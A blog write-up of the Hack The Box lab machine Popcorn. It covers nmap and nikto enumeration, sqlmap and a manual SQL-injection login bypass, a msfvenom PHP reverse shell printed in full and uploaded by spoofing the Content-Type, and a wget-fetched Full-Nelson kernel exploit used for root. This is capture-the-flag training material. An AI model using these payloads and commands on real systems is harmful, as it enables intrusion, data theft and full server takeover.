---
layout: post
title:  "HTB Popcorn Walkthrough with Kali"
categories: KaliSetup
tags: [LabSetup, Kali, HTB]
thumb: https://www.hackthebox.eu/storage/avatars/06ffcd9635c701b4b6667ae4c97cc7e5.png
---

A while back I re-started my Hack the Box journey, eventually making it to Guru. This post covers my write-up of Popcorn : 10.10.10.6 using Kali Linux.

## Why Popcorn?

Popcorn is an interesting box, it has an easy to access web layer but requires a little bit of custom testing to actually get a reverse shell. Once you get into the box it is exploitable via it's 'classic' kernel which easily allows root access to the system. This box is rated medium difficulty and is a great example of an 'OSCP like' box as it tells a story with believable weaknesses. By way of comparison Popcorn took around 8 hours to beat and individual OSCP exam challenges take me between 40 min and 6 hours each.

## Enumeration

First we assign the ip addresses to a local variables:

{% highlight shell %}
POPCORN=10.10.10.6
ATTACK=10.10.14.34
{% endhighlight %}

First we run the nmap scan (avoiding the ping) to identify the running services:

{% highlight shell %}
nmap $POPCORN -Pn
{% endhighlight %}

This gives me the following output

{% highlight plaintext %}
Nmap scan report for 10.10.10.6
Host is up (0.046s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
{% endhighlight %}

Immediately this looks like a Linux webserver, I kick up the gas to a more aggressive and focused scan:

{% highlight shell %}
sudo nmap -sV --script=http-enum $POPCORN -Pn -p 80
{% endhighlight %}

and get the following:

{% highlight plaintext %}
Nmap scan report for 10.10.10.6
Host is up (0.042s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.17 - 2.6.36 (95%), Linux 2.6.32 (95%), Linux 2.6.35 (95%), Linux 2.4.20 (Red Hat 7.2) (95%), Linux 2.6.17 (95%), Linux 2.6.30 (95%), AVM FRITZ!Box FON WLAN 7240 WAP (94%), Canon imageRUNNER ADVANCE C3320i or C3325 copier (94%), Android 2.3.5 (Linux 2.6) (94%), Epson WF-2660 printer (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   39.30 ms 10.10.14.1
2   39.38 ms 10.10.10.6
{% endhighlight %}


Two open ports don't seem like a lot, but one of them is HTTP. Time for some analysis

## Triage

Immediately I'm reluctant to look at the SSH service as it's behind authentication. I'll park that for later and look at the web app.

At this point most folks break out dirbuster or go buster, but we'll crack on with nmap.
I set a fast time scan with 20 parallel channels to run the http-enum directories and files against Popcorn on port 80

{% highlight shell %}
sudo nmap -T5 --max-parallelism=20 --script=http-enum $POPCORN -Pn -p 80
{% endhighlight %}

within a few seconds I get the following:

{% highlight plaintext %}
Nmap scan report for 10.10.10.6
Host is up (0.045s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /test/: Test page
|   /test.php: Test page
|   /test/logon.html: Jetty
|_  /icons/: Potentially interesting folder w/ directory listing
{% endhighlight %}


This uses a default wordlist with common directories and filenames.
Useful to get started with for general analysis, but we want to dig deeper. 

When dealing with web apps I like to spider into directories using a directory wordlist from dirbuster called __directory-list-2.3-medium.txt__.

This file is larger than the basic enum scripts available with nmap, but not so large that it will take forever to complete.

Nmap's http-enum script uses the resources of the nikto web scanner to perform its enumeration, and while most folks break out a scan with dirbuster or gobuster, I usually follow up nmap scanning with nikto and move to ZAP with dirbuster if I have to use something with a GUI. 

Nikto can perform a dir enum via the following command: 

{% highlight shell %}
sudo nikto -h $POPCORN -mutate 6 -mutate-options directory-list-2.3-medium.txt
{% endhighlight %}

The mutate option is on the deprecate hit-list for this tool, as an alternate we can specify the attack vector via a plugin mode:

{% highlight shell %}
sudo nikto -h $POPCORN -Plugins "@@DEFAULT;dictionary(dictionary:/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt)"
{% endhighlight %}

Soon we begin to see a return:

{% highlight plaintext %}
---------------------------------------------------------------------------
+ Target IP:          10.10.10.6
+ Target Hostname:    10.10.10.6
+ Target Port:        80
+ Start Time:         2020-02-11 21:19:24 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.2.12 (Ubuntu)
+ Server may leak inodes via ETags, header found with file /, inode: 43621, size: 177, mtime: Fri Mar 17 17:07:05 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'tcn' found, with contents: choice
+ Found file /index
+ Retrieved x-powered-by header: PHP/5.2.10-2ubuntu6.10
+ Found file /test
+ Found file /torrent
+ Found file /rename
{% endhighlight %}


Unlike some nmap scripts, nikto is non invasive. Without specifying a plugin/mutation the default operation provides ample information to add to our enumeration. Which we can trigger on specific directories with:

{% highlight shell %}
sudo nikto -h $POPCORN/torrent/
{% endhighlight %}

We should take care to note however that weaknesses are the result of a light probing and are therefore not always accurate, any findings here will need a manual follow up.

Back to the dir enum. As there are 220,000+ urls to check we'll crack on with the manual analysis in a different terminal.

/torrent and /rename are both interesting finds, lets cURL them:

starting with rename we get a redirect, so I follow it:

{% highlight shell %}
curl -kiL $POPCORN/rename
{% endhighlight %}

to get:

{% highlight http %}
HTTP/1.1 301 Moved Permanently
Date: Tue, 11 Feb 2020 21:29:13 GMT
Server: Apache/2.2.12 (Ubuntu)
Location: http://10.10.10.6/rename/
Vary: Accept-Encoding
Content-Length: 309
Content-Type: text/html; charset=iso-8859-1
HTTP/1.1 200 OK
Date: Tue, 11 Feb 2020 21:29:13 GMT
Server: Apache/2.2.12 (Ubuntu)
X-Powered-By: PHP/5.2.10-2ubuntu6.10
Vary: Accept-Encoding
Content-Length: 95
Content-Type: text/html
Renamer API Syntax: index.php?filename=old_file_path_an_name&newfilename=new_file_path_and_name
{% endhighlight %}

Interesting, a couple of variables that might allow us to do some file enumeration. I park this just now as I wonder if I can use it to read configs specified in the php.info() details from the /test URL.

On to torrent, which also bounces me through a redirect but takes me to a full on webapp:

{% highlight shell %}
curl -kiL $POPCORN/torrent
{% endhighlight %}

Just the headers this time: 

{% highlight shell %}
curl -kIL $POPCORN/torrent
{% endhighlight %}

Gives us:

{% highlight http %}
HTTP/1.1 301 Moved Permanently
Date: Tue, 11 Feb 2020 21:40:47 GMT
Server: Apache/2.2.12 (Ubuntu)
Location: http://10.10.10.6/torrent/
Vary: Accept-Encoding
Content-Type: text/html; charset=iso-8859-1
HTTP/1.1 200 OK
Date: Tue, 11 Feb 2020 21:40:47 GMT
Server: Apache/2.2.12 (Ubuntu)
X-Powered-By: PHP/5.2.10-2ubuntu6.10
Set-Cookie: PHPSESSID=b0a2662beb823b3bc800b2b3723549b0; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html
{% endhighlight %}

At this point we need to get the browser involved, spinning up FireFox I go to http://10.10.10.6/torrent/ to find a full fledged web app.

![torrent_hoster.png](/assets/images/KaliSetup/torrent_hoster.png)

From here I can interact with the site, even create a profile and register as a user.

![make_user.png](/assets/images/KaliSetup/make_user.png)

Because there is no email validation I can just login with the user I made!
At this point my triage begins to bear fruit as now I can interact with the website as an authenticated user.

At this point I can begin to start looking for a way to exploit the system.

## Exploit

First I'm going to look for known issues, checking searchsploit with:

{% highlight shell %}
searchsploit torrent hoster
{% endhighlight %}

gives me a single exploit:

{% highlight plaintext %}
-------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                            |  Path
                                                                          | (/usr/share/exploitdb/)
-------------------------------------------------------------------------- ----------------------------------------
Torrent Hoster - Remount Upload                                           | exploits/php/webapps/11746.txt
-------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
{% endhighlight %}

examining the exploit with 

{% highlight shell %}
searchsploit -x 11746
{% endhighlight %}

It looks like there are a few syntax issues but the exploit suggests that we have a way to upload code execution. Since I have an authenticated user this could be the way in, but lets poke about to make sure the required components are there.

I want a vanilla connection experience to debug this, so I logout first.

Going through the exploit I see the following urls:

1. torrenthoster/torrents.php?mode=upload
2. torrenthoster/upload.php
3. torrenthoster/torrents/
4. torrenthoster/users/forgot_password.php/

Assuming torrenthoster is the root url for the webapp i change it to torrent and visit the following urls in the browser:

1. http://10.10.10.6/torrent/torrents.php?mode=upload
2. http://10.10.10.6/torrent/upload.php
3. http://10.10.10.6/torrent/torrents/
4. http://10.10.10.6/torrent/users/forgot_password.php/


http://10.10.10.6/torrent/torrents.php?mode=upload bounces back to what looks like the index, I maybe need to be authenticated to view it.

http://10.10.10.6/torrent/upload.php and http://10.10.10.6/torrent/torrents/ both return white empty pages in the browser, suggesting they load something but what? At this stage I can't say.

http://10.10.10.6/torrent/users/forgot_password.php/ returns a reset your password form page as expected

Lets curl the pages:

{% highlight shell %}
curl -Ik http://$POPCORN/torrent/torrents.php?mode=upload
{% endhighlight %}

returns:

{% highlight http %}
HTTP/1.1 200 OK
Date: Tue, 11 Feb 2020 21:43:13 GMT
Server: Apache/2.2.12 (Ubuntu)
X-Powered-By: PHP/5.2.10-2ubuntu6.10
Set-Cookie: PHPSESSID=21d435352fe9a2616b32bd5252003068; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: private
Pragma: no-cache
Vary: Accept-Encoding
Content-Type: text/html
{% endhighlight %}


I also returns a similar responses from the other urls, but no Cookie settings with

{% highlight shell %}
curl -ik http://$POPCORN/torrent/torrents/
curl -ik http://$POPCORN/torrent/upload.php
{% endhighlight %}

When I run the curl commands with the -i flags on those, /torrents/ returns the same details but:

{% highlight shell %}
curl -ik http://$POPCORN/torrent/upload.php
{% endhighlight %}

gives me debugging page, which near the bottom leaks some useful information about the dB:

{% highlight html %}
<br />
<b>Warning</b>:  mysql_query() [<a href='function.mysql-query'>function.mysql-query</a>]: Access denied for user 'www-data'@'localhost' (using password: NO) in <b>/var/www/torrent/upload.php</b> on line <b>443</b><br />
<br />
<b>Warning</b>:  mysql_query() [<a href='function.mysql-query'>function.mysql-query</a>]: A link to the server could not be established in <b>/var/www/torrent/upload.php</b> on line <b>443</b><br />
<br />
<b>Fatal error</b>:  Call to undefined function sqlerr() in <b>/var/www/torrent/upload.php</b> on line <b>443</b><br />
{% endhighlight %}

Now I know for sure that we are using MySQL, if I can get a sql injection I can try and exploit the server with sqlmap.

back to the login page: http://10.10.10.6/torrent/login.php, viewing the source code for the form:

![inputs.png](/assets/images/KaliSetup/inputs.png)

I can pull out the 2 variables, username and password.
Using an attack proxy like ZAP I can follow the login process to failure and determine the POST method is used. This gives me the syntax:

{% highlight shell %}
sqlmap -u http://$POPCORN/torrent/login.php --data="username=pwnd&password=pwnd" --method POST --dbms MySQL --thread=5 --tables
{% endhighlight %}

quickly the tool comes back with

{% highlight plaintext %}
[INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
{% endhighlight %}

I up the level and risk to 1, but avoid following any redirects to get:

{% highlight plaintext %}
[INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable
{% endhighlight %}

I can work with this to manually exploit if needed, I let the tests and eventually after trying a few different interactive options get the following results:

{% highlight plaintext %}
sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=pwnd' OR NOT 2740=2740#&password=pwnd
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=pwnd' AND (SELECT 8745 FROM(SELECT COUNT(*),CONCAT(0x716a786b71,(SELECT (ELT(8745=8745,1))),0x7162716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DGhR&password=pwnd
    Type: time-based blind
    Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
    Payload: username=pwnd' AND 5766=BENCHMARK(5000000,MD5(0x69424279))-- wnNK&password=pwnd
{% endhighlight %}

Importantly I get the dB details:

{% highlight plaintext %}
Database: torrenthoster
[8 tables]
+---------------------------------------+
| ban                                   |
| categories                            |
| comments                              |
| log                                   |
| namemap                               |
| news                                  |
| subcategories                         |
| users                                 |
+---------------------------------------+
Database: information_schema
[28 tables]
+---------------------------------------+
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
+---------------------------------------+
{% endhighlight %}

Lets get all the goodies

{% highlight shell %}
sqlmap -u http://$POPCORN/torrent/login.php --data="password=pwnd&username=pwnd" --method POST --dbms MySQL --thread=5 -a
{% endhighlight %}

This takes a little while, but eventually from __~/.sqlmap/output/10.10.10.6/dump/torrenthoster/users.csv__ I get the admin account details: 

{% highlight plaintext %}
id,email,joined,userName,password,privilege,lastconnect
3,admin@yourdomain.com,2007-01-06 21:12:46,Admin,d5bfedcee289e5e05b86daad8ee3e2e2,admin,2007-01-06 21:12:46
{% endhighlight %}

Normally at this point I'd fire the password hash `d5bfedcee289e5e05b86daad8ee3e2e2` through a decrypter but it isn't nesessary to get logged into the app as admin.

Because the injection point was in the login and it responded to boolean sqli on the username variable I can try a blind login.

Now at this point an option a more aggressive option would be to force a shell with sqlmap's os-shell flag. I'll admit I tried it but struggled to find a writable directory for the exploit to work. 

Attacking this way isn't my strong suit, the OSCP certification doesn't allow autopwn attacks with this tool so I'm not so familiar with the nuance of the approach. I park this vector to go back to and research if I get no where with the SQLi.

Going to the login page on the site I try the following username:

{% highlight sql %}
Admin' or 1=1; #
{% endhighlight %}

And I can put whatever I want as the password (but I do need to put something in this case), in effect (I hope) creating a similar sql statement to the one below 

{% highlight sql %}
SELECT *
FROM users
WHERE username = 'Admin' or 1=1; # AND password = 'doesn't matter I'm a comment>';
{% endhighlight %}

This statement will return all the details for all entries of the users table where the username is `Admin` or things are True (1=1). As I just said 1=1 is true SQLi will return the details of the first account in the dB with all its details as the active account to use.

In fact when I debugged later the sql was:

{% highlight sql %}
SELECT userName, password, privilege, email
	FROM users
	WHERE userName = '' AND password = ''
{% endhighlight %}

This works as most logins do, pass the username and the hashed version of the password to the username table.

If the result is True, i.e. the username and password details in the table match those supplied, give me access details required for the username.

Because our injection attack in effect becomes:

{% highlight sql %}
SELECT userName, password, privilege, email
FROM users
WHERE username = 'Admin' or 1=1; # AND password = 'doesn't matter I'm a comment>';
{% endhighlight %}

We return a True on the query and a pass on the login check. This gives us the first record of the dB by default to use which is usually the root/admin, as it is needed to set up most dBs.

The result is that this gets me an admin login, evident by the fact I can now view and edit the uploads at http://10.10.10.6/torrent/torrents.php?mode=upload

![authenticated.png](/assets/images/KaliSetup/authenticated.png)

So this is pretty cool I have admin level app control, I can mess with the app as a power user.

Now that I have a good level of access to the app I return to the exploit code to see if I can use anything. An upload vulnerability potentially allows me to get a reverse shell on the box.

When I examined the exploit, I can honestly say this stumped me for quite a while.

I could not really make sense the exploit, the replacement character &#65533; (&#65533)  is everywhere and the code makes little sense intially. 

Looking at the source code on the upload page I could see vague similarities to the exploit but nothing concrete. Still, convinced that a file upload could be a possible vector I set up ZAP as an attack proxy on port 8080 with FireFox to record details as I run through the site manually.

Going to the torrent directory I spy a Kali Linux torrent upload: http://10.10.10.6/torrent/index.php?mode=directory and go to it http://10.10.10.6/torrent/torrents.php?mode=details&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4

![kali_torrent.png](/assets/images/KaliSetup/kali_torrent.png)

Which I can edit:

![torrent_edit.png](/assets/images/KaliSetup/torrent_edit.png)

Beginning to suspect that I can edit the image or torrent file via this window, I could force the application to take some code injected into an image or torrent provided the area it renders on the server knows how to execute the code.

I know I'm dealing with PhP pages, this gives me the language for my payload, now I just have to find a place that will render php content in the uploads.

Closing down the editor I examine the torrent details and notice the image links out to:
http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png 

I follow it, but pull one level back to see if we have Directory Listing on http://10.10.10.6/torrent/upload/ which I do:


![uploads.png](/assets/images/KaliSetup/uploads.png)

This might work if I can upload a malformed image. The edit specifies this needs to be in an image format and no larger than 100Kb, a little limiting but maybe usable.

I check the torrent link 10.10.10.6/torrent/torrents.php?mode=download&id=723bc28f9b6f924cca68ccdff96b6190566ca6b4 which in theory could be big, but the url stays in the same page, with the API looking to fetch a resource from an unknown storage location. I'd need the source code to work that out, at this point a malformed image looks like a good option to try.  

First I need a payload, I'm going with a raw reverse shell that will connect back to me on port 1337 in php 

{% highlight shell %}
msfvenom -p php/reverse_php lhost=$ATTACK lport=1337 -f raw 
{% endhighlight %}

This gives me:

{% highlight plaintext %}
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3024 bytes
/*<php>/**/
EXPLOIT
{% endhighlight %}

Under my 100kb, that beats the size requirement. I specify a file to hold my code:


{% highlight shell %}
msfvenom -p php/reverse_php lhost=$ATTACK lport=1337 -f raw -o evil.php
{% endhighlight %}

And try an upload, which returns `Invalid file`.

This is expected as the form specifies the upload must be in image format.

I go to ZAP to get the details, the Request data from the latest edit page is:

{% highlight php %}
-----------------------------6880877471789511041406832871
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: application/x-php
    /*<?php /**/
      @error_reporting(0);
      @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
      $dis=@ini_get('disable_functions');
      if(!empty($dis)){
        $dis=preg_replace('/[, ]+/', ',', $dis);
        $dis=explode(',', $dis);
        $dis=array_map('trim', $dis);
      }else{
        $dis=array();
      }
      
    $ipaddr='10.10.14.34';
    $port=1337;
    if(!function_exists('CkLhPZUPboOwI')){
      function CkLhPZUPboOwI($c){
        global $dis;
        
      if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
        $c=$c." 2>&1\n";
      }
      $EPWc='is_callable';
      $JZlmOv='in_array';
      
      if($EPWc('passthru')and!$JZlmOv('passthru',$dis)){
        ob_start();
        passthru($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      if($EPWc('exec')and!$JZlmOv('exec',$dis)){
        $o=array();
        exec($c,$o);
        $o=join(chr(10),$o).chr(10);
      }else
      if($EPWc('proc_open')and!$JZlmOv('proc_open',$dis)){
        $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
        $o=NULL;
        while(!feof($pipes[1])){
          $o.=fread($pipes[1],1024);
        }
        @proc_close($handle);
      }else
      if($EPWc('shell_exec')and!$JZlmOv('shell_exec',$dis)){
        $o=shell_exec($c);
      }else
      if($EPWc('popen')and!$JZlmOv('popen',$dis)){
        $fp=popen($c,'r');
        $o=NULL;
        if(is_resource($fp)){
          while(!feof($fp)){
            $o.=fread($fp,1024);
          }
        }
        @pclose($fp);
      }else
      if($EPWc('system')and!$JZlmOv('system',$dis)){
        ob_start();
        system($c);
        $o=ob_get_contents();
        ob_end_clean();
      }else
      {
        $o=0;
      }
    
        return $o;
      }
    }
    $nofuncs='no exec functions';
    if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
      $s=@fsockopen("tcp://10.10.14.34",$port);
      while($c=fread($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=CkLhPZUPboOwI(substr($c,0,-1));
          if($out===false){
            fwrite($s,$nofuncs);
            break;
          }
        }
        fwrite($s,$out);
      }
      fclose($s);
    }else{
      $s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
      @socket_connect($s,$ipaddr,$port);
      @socket_write($s,"socket_create");
      while($c=@socket_read($s,2048)){
        $out = '';
        if(substr($c,0,3) == 'cd '){
          chdir(substr($c,3,-1));
        } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
          break;
        }else{
          $out=CkLhPZUPboOwI(substr($c,0,-1));
          if($out===false){
            @socket_write($s,$nofuncs);
            break;
          }
        }
        @socket_write($s,$out,strlen($out));
      }
      @socket_close($s);
    }
-----------------------------6880877471789511041406832871
Content-Disposition: form-data; name="submit"
Submit Screenshot
-----------------------------6880877471789511041406832871--
{% endhighlight %}

Note we specify the content type header in our submission as `Content-Type: application/x-php`

Lets replay with the Request Editor Feature in ZAP it by right clicking on the data and editing the header as:

{% highlight http %}
-----------------------------6880877471789511041406832871
Content-Disposition: form-data; name="file"; filename="evil.php"
Content-Type: image/png
{% endhighlight %}

This time I get the following response data:

{% highlight http %}
Upload: evil.php<br />Type: image/png<br />Size: 2.962890625 Kb<br />Upload Completed. <br />Please refresh to see the new screenshot.
{% endhighlight %}

Looks like the server doesn't restrict the upload types.

I set up a listener on my Linux with:

{% highlight shell %}
nc -nvlp 1337
{% endhighlight %}

Right click the "no image found" image url and get a shell:

{% highlight plaintext %}
listening on [any] 1337 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 48695
{% endhighlight %}

This times out after 20 seconds because of the ZAP proxy settings:

{% highlight plaintext %}
Failed to read http://10.10.10.6/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.php within 20 seconds, check to see if the site is available and if so consider adjusting ZAP's read time out in the Connection options panel.
{% endhighlight %}

I disable the proxy and shutdown ZAP as its done its job and re-trigger the connection.

With this access I have a low priv shell and can claim the user flag.

{% highlight shell %}
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
{% endhighlight %}


## Priv Escalation

I try to upgrade to a bash shell with python:

{% highlight shell %}
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

But the shell is flaky and times out, I need a better shell but my php sucks.
Luckily Kali comes equiped with webshells.

I reactivate the proxy on FireFox for ZAP, only this time when I replay I also specify my IP address and 1337 as the port number as well as the Content Type:

{% highlight php %}
-----------------------------1429460769362258019814915645
Content-Disposition: form-data; name="file"; filename="php-reverse-shell.php"
Content-Type: application/x-php
.
.
.
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.34';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
{% endhighlight %}

This time my listener returns:

{% highlight plaintext %}
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.6] 54293
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
 00:06:57 up  2:08,  0 users,  load average: 3.13, 2.86, 1.74
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: can't access tty; job control turned off
{% endhighlight %}

and when I upgrade to bash:

{% highlight shell %}
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
{% endhighlight %}

I get:

{% highlight plaintext %}
www-data@popcorn:/$ 
{% endhighlight %}

Typically I now would hammer through a few different enumeration techniques, following a guide like g0tmi1k's awesome introduction to [Basic Linux Privilege Escalation] (https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/), however I'm instantly drawn to the uname output my shell gave me:

{% highlight plaintext %}
Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
{% endhighlight %}

This is a really old kernel build and it probrably has a few exploits kicking about.

Checking searchsploit gives dozens and dozens, but a couple of nuke level exploits stick out:

{% highlight plaintext %}
searchsploit linux kernel 2.6 nelson
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local Privileg | exploits/linux/local/15704.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Es | exploits/linux/local/17787.c
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
Papers: No Result
{% endhighlight %}

Vaguely recalling a morning commute read the Full and Half Nelsons ring a bell as a reliable and deadly exploit.

After reading through 15704.c and doing a test compile on the attacker it looks decent enough but I need a compiler for i686 arch to run.

I check for the gcc compiler on popcorn:

{% highlight shell %}
which gcc
{% endhighlight %}

to get

{% highlight plaintext %}
/usr/bin/gcc
{% endhighlight %}

Sweet, if I transfer the exploit it should compile, now on a new window I pop a quick python webserver on the attacker:

{% highlight shell %}
sudo python -m SimpleHTTPServer 80
{% endhighlight %}

Back to popcorn I move to /tmp pull the exploit over with wget and compile:

{% highlight shell %}
cd /tmp && wget http://10.10.14.34/15704.c
gcc 15704.c -o evil
{% endhighlight %}

I run the exploit

{% highlight shell %}
./evil
{% endhighlight %}

Boom! I'm root! W00tW00t!

{% highlight shell %}
id
uid=0(root) gid=0(root)
{% endhighlight %}

From here getting the flags is easy.

## Conclusions

In this post I covered an in-depth look at attacking the Popcorn machine.

We looked at basic scanning and enumeration of services to find a hidden webapp. I then bypassed the authentication controls via SQLi which gave me admin access to the web app. From here I was able to double down on inadequete file upload santisation to install a reverse shell. From here it was trivial to maintain my persistence and work towards exploiting the insecure kernel.

This post concludes the [KaliSetup](/posts/#{{ categories }}) series, where I set up Kali and Commando VMs in HyperV. I then built on the Kali VM to set up for use in [HTB](https://www.hackthebox.eu/home){:target="_blank"} and then broke into the retired Popcorn machine.